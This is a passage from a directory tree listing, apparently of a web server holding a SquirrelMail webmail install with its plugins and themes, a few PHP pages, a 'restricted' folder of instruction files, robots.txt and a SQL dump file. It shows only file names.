|   |   |   `-- setup.php
|   |   |-- mail_fetch
|   |   |   |-- README
|   |   |   |-- class.POP3.php
|   |   |   |-- fetch.php
|   |   |   |-- functions.php
|   |   |   |-- index.php
|   |   |   |-- options.php
|   |   |   `-- setup.php
|   |   |-- message_details
|   |   |   |-- index.php
|   |   |   |-- message_details_bottom.php
|   |   |   |-- message_details_main.php
|   |   |   |-- message_details_top.php
|   |   |   `-- setup.php
|   |   |-- newmail
|   |   |   |-- HISTORY
|   |   |   |-- README
|   |   |   |-- index.php
|   |   |   |-- newmail.php
|   |   |   |-- newmail_opt.php
|   |   |   |-- setup.php
|   |   |   |-- sounds
|   |   |   |   |-- FanFair.wav
|   |   |   |   |-- Friends.wav
|   |   |   |   |-- MontyPython.wav
|   |   |   |   |-- Notify.wav
|   |   |   |   `-- index.php
|   |   |   `-- testsound.php
|   |   |-- sent_subfolders
|   |   |   |-- index.php
|   |   |   `-- setup.php
|   |   |-- spamcop
|   |   |   |-- README
|   |   |   |-- index.php
|   |   |   |-- options.php
|   |   |   |-- setup.php
|   |   |   `-- spamcop.php
|   |   |-- squirrelspell
|   |   |   |-- INSTALL
|   |   |   |-- doc
|   |   |   |   |-- CRYPTO
|   |   |   |   |-- ChangeLog
|   |   |   |   |-- PRIVACY
|   |   |   |   |-- README
|   |   |   |   |-- UPGRADING
|   |   |   |   `-- index.php
|   |   |   |-- index.php
|   |   |   |-- js
|   |   |   |   |-- WHATISTHIS
|   |   |   |   |-- check_me.js
|   |   |   |   |-- crypto_settings.js
|   |   |   |   |-- decrypt_error.js
|   |   |   |   |-- index.php
|   |   |   |   `-- init.js
|   |   |   |-- modules
|   |   |   |   |-- WHATISTHIS
|   |   |   |   |-- check_me.mod
|   |   |   |   |-- crypto.mod
|   |   |   |   |-- crypto_badkey.mod
|   |   |   |   |-- edit_dic.mod
|   |   |   |   |-- enc_setup.mod
|   |   |   |   |-- forget_me.mod
|   |   |   |   |-- forget_me_not.mod
|   |   |   |   |-- index.php
|   |   |   |   |-- init.mod
|   |   |   |   |-- lang_change.mod
|   |   |   |   |-- lang_setup.mod
|   |   |   |   `-- options_main.mod
|   |   |   |-- setup.php
|   |   |   |-- sqspell_config.php
|   |   |   |-- sqspell_functions.php
|   |   |   |-- sqspell_interface.php
|   |   |   `-- sqspell_options.php
|   |   |-- test
|   |   |   |-- COPYING
|   |   |   |-- INSTALL
|   |   |   |-- README
|   |   |   |-- decodeheader.php
|   |   |   |-- functions.php
|   |   |   |-- index.php
|   |   |   |-- ngettext.php
|   |   |   |-- setup.php
|   |   |   `-- test.php
|   |   `-- translate
|   |       |-- README
|   |       |-- index.php
|   |       |-- options.php
|   |       `-- setup.php
|   |-- po
|   |   |-- compilepo
|   |   |-- independent_strings.txt
|   |   |-- index.php
|   |   |-- mergepo
|   |   |-- squirrelmail.pot
|   |   `-- xgetpo
|   |-- src
|   |   |-- addrbook_popup.php
|   |   |-- addrbook_search.php
|   |   |-- addrbook_search_html.php
|   |   |-- addressbook.php
|   |   |-- compose.php
|   |   |-- configtest.php
|   |   |-- delete_message.php
|   |   |-- download.php
|   |   |-- empty_trash.php
|   |   |-- folders.php
|   |   |-- folders_create.php
|   |   |-- folders_delete.php
|   |   |-- folders_rename_do.php
|   |   |-- folders_rename_getname.php
|   |   |-- folders_subscribe.php
|   |   |-- help.php
|   |   |-- image.php
|   |   |-- index.php
|   |   |-- left_main.php
|   |   |-- login.php
|   |   |-- mailto.php
|   |   |-- move_messages.php
|   |   |-- options.php
|   |   |-- options_highlight.php
|   |   |-- options_identities.php
|   |   |-- options_order.php
|   |   |-- printer_friendly_bottom.php
|   |   |-- printer_friendly_main.php
|   |   |-- printer_friendly_top.php
|   |   |-- read_body.php
|   |   |-- redirect.php
|   |   |-- right_main.php
|   |   |-- search.php
|   |   |-- signout.php
|   |   |-- vcard.php
|   |   |-- view_header.php
|   |   |-- view_text.php
|   |   `-- webmail.php
|   `-- themes
|       |-- README.themes
|       |-- alien_glow.php
|       |-- autumn.php
|       |-- autumn2.php
|       |-- black_bean_burrito_theme.php
|       |-- blue_grey_theme.php
|       |-- blue_on_blue.php
|       |-- bluesnews_theme.php
|       |-- bluesome.php
|       |-- bluesteel_theme.php
|       |-- christmas.php
|       |-- classic_blue.php
|       |-- classic_blue2.php
|       |-- css
|       |   |-- comic-sans-08.css
|       |   |-- comic-sans-10.css
|       |   |-- comic-sans-12.css
|       |   |-- index.php
|       |   |-- sans-08.css
|       |   |-- sans-10.css
|       |   |-- sans-12.css
|       |   |-- serif-10.css
|       |   |-- serif-12.css
|       |   |-- tahoma-08.css
|       |   |-- tahoma-10.css
|       |   |-- tahoma-12.css
|       |   |-- verdana-08.css
|       |   |-- verdana-10.css
|       |   `-- verdana-12.css
|       |-- dark_green.php
|       |-- dark_grey_theme.php
|       |-- darkness.php
|       |-- deepocean2_theme.php
|       |-- deepocean_theme.php
|       |-- default_theme.php
|       |-- dompie_theme.php
|       |-- forest_theme.php
|       |-- greenhouse_effect.php
|       |-- high_contrast_theme.php
|       |-- ice_theme.php
|       |-- in_the_pink.php
|       |-- index.php
|       |-- kind_of_blue.php
|       |-- maize_theme.php
|       |-- methodical_theme.php
|       |-- midnight.php
|       |-- minimal_bw.php
|       |-- monostochastic.php
|       |-- netstyle_theme.php
|       |-- penguin.php
|       |-- plain_blue_theme.php
|       |-- powder_blue.php
|       |-- purple_theme.php
|       |-- random.php
|       |-- redmond.php
|       |-- sandstorm_theme.php
|       |-- seaspray_theme.php
|       |-- servery_theme.php
|       |-- shades_of_grey.php
|       |-- silver_steel_theme.php
|       |-- simple_green2.php
|       |-- simple_green_theme.php
|       |-- simple_purple.php
|       |-- slashdot_theme.php
|       |-- spice_of_life.php
|       |-- spice_of_life_dark.php
|       |-- spice_of_life_lite.php
|       |-- techno_blue.php
|       |-- turquoise.php
|       `-- wood_theme.php
|-- pages
|   |-- blog.php
|   |-- research.php
|   `-- search.php
|-- restricted
|   |-- blog_instructions.txt
|   `-- webmail_instructions.txt
|-- robots.txt
`-- sql
    `-- db.sql

```

